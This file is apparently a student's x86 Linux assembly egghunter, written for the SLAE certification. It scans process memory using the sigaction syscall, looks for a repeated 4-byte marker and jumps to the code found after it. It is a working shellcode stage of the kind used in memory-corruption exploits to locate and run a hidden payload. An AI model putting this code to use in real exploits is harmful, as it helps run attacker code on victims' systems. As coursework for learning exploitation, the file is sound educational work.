; Tested on:
; Ubuntu 17.04 
; Linux 4.10.0-42-generic i686
; 
; This has been created for completing the requirements of the 
; SecurityTube Linux Assembly Expert certification: 
; http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
;  
; Student ID: SLAE-966 
; 
; References: 
; 1) Hacking: The Art of Exploitation by Jon Erickson
; 2) http://man7.org/linux/man-pages/man2/
; 3) Safely Searching Process Virtual Address Space by Skape
;	http://web.archive.org/web/20061010194043/http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
;

global _start
section .text

_start:
; sigaction(2) implementation
page_align:
	or cx,0xfff 		; page alignment
next_address:
	inc ecx
	push byte +0x43		; sigaction(2)
	pop eax
	int 0x80
	cmp al,0xf2
	jz page_align		; jz 0x0
	mov eax,0x50905090
	mov edi,ecx
	scasd
	jnz next_address	; jnz 0x5
	scasd
	jnz next_address	; jnz 0x5
	jmp edi